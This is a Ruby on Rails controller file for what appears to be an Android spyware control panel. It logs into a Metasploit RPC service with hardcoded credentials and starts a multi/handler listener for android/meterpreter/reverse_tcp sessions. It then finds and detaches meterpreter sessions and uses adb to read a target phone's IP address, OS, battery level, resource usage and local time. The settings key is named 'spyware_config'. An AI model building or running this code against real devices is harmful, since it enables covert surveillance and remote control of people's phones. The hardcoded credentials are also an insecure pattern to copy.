require "msfrpc-client"
require "date"
require_relative "../../lib/msf_instrumentation"

class ApplicationController < ActionController::Base
  include MsfInstrumentation::ApplicationControllerMixin
  @@adbTarget = nil
  @@isAdbConnected = false
  @@isMsfConnected = false
  @@cpuUsage = @@memoryUsage = @@storage = 0
  @@nrFinishedProcesses = 0
  @@nrRunningProcesses = 0
  @@soundMode = 2
  @@isAdbStarted = false
  @@ipAddress = "Unknown"
  @@operatingSystem = "Unknown"
  @@isRooted = "Unknown"
  @@batteryLevel = "Unknown"
  @@localHour = "Unknown"

  # New Helper for Service Integration
  def get_active_session_id(smartphone)
    # This logic mimics the legacy session retrieval
    # In V4/V5, we often just grabbed the first available session or matched via IP
    # Ideally, we query the RPC client for a session matching the APK's connection details
    begin
      user = "cool"
      password = "looc"
      options = {
        host: ENV["RAILS_HOST"] || "metasploit",
        port: 3333,
        uri: "/api/",
        ssl: true,
      }
      rpc = Msf::RPC::Client.new(options)
      rpc.login(user, password)
      
      # Get all sessions
      sessions = rpc.call("session.list")
      return nil if sessions.empty?
      
      # Logic to match smartphone to session
      # Simplified: Return first active android session
      sessions.each do |sid, info|
        return sid if info['type'] == 'meterpreter' && info['platform'] == 'android'
      end
      
      nil
    rescue
      nil
    end
  end

  # Wrapping legacy helpers with traced implementations
  def start_msf_process(command)
    start_msf_process_traced(command)
  end

  def run_adb_command(command)
    # Use the new Service if possible, otherwise fallback to traced legacy
    # For simple shell commands, AdbService is better.
    AdbService.new(@@adbTarget).shell(command.to_s.gsub('shell ', ''))
  rescue
    run_adb_command_traced(command)
  end

  def detach_session
    begin
      require "msfrpc-client"
      require "date"
      user = "cool"
      password = "looc"
      options = {
        host: ENV["RAILS_HOST"],
        port: 3333,
        uri: "/api/",
        ssl: true,
      }
      rpc = Msf::RPC::Client.new(options)
      rpc.login(user, password)
      payloadOptions = {
        "PAYLOAD" => "android/meterpreter/reverse_tcp",
        "LHOST" => "0.0.0.0",
        "LPORT" => 4444,
      }
      job = rpc.call("module.execute", "exploit", "multi/handler", payloadOptions)
      session = rpc.call("session.list").keys[0]

      puts rpc.call("session.meterpreter_session_detach", session)
      sleep 4
      commandOutput = rpc.call("session.meterpreter_read", session).values()[0].split('\n')
    rescue
      commandOutput = "Operation Failed"
      puts "Error detaching session."
    end
    return commandOutput
  end

  def update_cpu_usage
    begin
      puts " target"
      cpuOutput1 = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell cat /proc/stat`.split("\n")[0].split.drop(1).map(&:to_f)
      totalJiffles1 = cpuOutput1.inject(:+)
      workJiffles1 = cpuOutput1.slice(0, 3).inject(:+)
      sleep(0.5)
      cpuOutput2 = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell cat /proc/stat`.split("\n")[0].split.drop(1).map(&:to_f)
      totalJiffles2 = cpuOutput2.inject(:+)
      workJiffles2 = cpuOutput2.slice(0, 3).inject(:+)
      workOverPeriod = workJiffles2 - workJiffles1
      totalOverPeriod = totalJiffles2 - totalJiffles1
      @@cpuUsage = (workOverPeriod * 100 / totalOverPeriod).to_i
    rescue
      @@cpuUsage = 0
      puts "Error updating CPU Usage"
    end
  end

  def update_memory_usage
    begin
      memoryTotal = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell "cat /proc/meminfo | grep MemTotal"`.strip.gsub(/\D/, "").to_f
      memoryAvailable = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell "cat /proc/meminfo | grep MemAvailable"`.strip.gsub(/\D/, "").to_f
      @@memoryUsage = ((memoryTotal - memoryAvailable) / memoryTotal * 100).to_i
    rescue
      @@memoryUsage = 0
      puts "Error updating Memory Usage"
    end
  end

  def update_storage_usage
    begin
      totalMemory = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell "df /storage/emulated | tail -n +2"`.strip.split[1].gsub(/[^\d\.]/, "").to_f
      usedMemory = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell "df /storage/emulated | tail -n +2"`.strip.split[2].gsub(/[^\d\.]/, "").to_f
      @@storage = (usedMemory / totalMemory * 100).to_i
    rescue
      @@storage = 0
    end
  end

  def update_device_info
    begin
      @@ipAddress = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell "ip addr show wlan0 | grep inet | grep -v inet6"`.split[1].gsub(/\/\d*/, "")
      @@operatingSystem = "Android " + `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell getprop ro.build.version.release`.strip
      @@isRooted = "Rooted: No"
      @@localHour = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell date +%R`.strip
      @@batteryLevel = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell "dumpsys battery | grep level"`.split(":")[1].strip + "%"
    rescue
      puts "Error updating device info."
    end
  end

  def check_msf_connection
    begin
      user = "cool"
      password = "looc"
      options = {
        host: ENV["RAILS_HOST"],
        port: 3333,
        uri: "/api/",
        ssl: true,
      }
      rpc = Msf::RPC::Client.new(options)
      rpc.login(user, password)
      payloadOptions = {
        "PAYLOAD" => "android/meterpreter/reverse_tcp",
        "LHOST" => "0.0.0.0",
        "LPORT" => 4444,
      }
      job = rpc.call("module.execute", "exploit", "multi/handler", payloadOptions)
      sessions = rpc.call("session.list")
      @@isMsfConnected = sessions.size > 0 ? true : false
    rescue Msf::RPC::ServerException => e
      puts e
      puts "Docker MSF Container is Down"
    rescue
      puts "Failed checking MSF Connection"
    end
  end

  def check_adb_connection
    begin
      @@adbTarget = Rails.configuration.spyware_config["target_ip"]
      if !@@isAdbConnected
        #  if @@adbTarget != "usb"
        #    system("adb kill-server")
        #    system("adb tcpip 5555")
        #    system("adb connect #{@@adbTarget}")
        #  else
        #    system("adb kill-server")
        #    system("adb start-server")
        #  end
      end
      adbDevices = `adb -H #{ENV["ADB_HOST"]} devices`.split("\n")
      if (@@adbTarget == "usb" and adbDevices.size > 1 and adbDevices.any? { |line| line.strip.end_with? "device" }) or adbDevices.any? { |line| line =~ /#{@@adbTarget}:5555\s+device/ }
        @@adbTarget = adbDevices.find { |line| line.strip.end_with? "device" }.split[0] if @@adbTarget == "usb"
        @@isAdbConnected = true
        update_cpu_usage
        update_memory_usage
        update_storage_usage
        update_device_info
      else
        @@isAdbConnected = false
      end
    rescue
      puts "Error checking ADB connection"
    end
  end

  def check_connection
    check_msf_connection
    check_adb_connection
    respond_to do |format|
      format.js {
        render "check_connection", :locals => { :adbConnected => @@isAdbConnected,
                                                :msfConnected => @@isMsfConnected,
                                                :cpuUsage => @@cpuUsage,
                                                :memoryUsage => @@memoryUsage,
                                                :storage => @@storage,
                                                :nrRunningProcesses => @@nrRunningProcesses,
                                                :nrFinishedProcesses => @@nrFinishedProcesses,
                                                :ipAddress => @@ipAddress,
                                                :operatingSystem => @@operatingSystem,
                                                :isRooted => @@isRooted,
                                                :batteryLevel => @@batteryLevel,
                                                :localHour => @@localHour }
      }
    end
  end
end
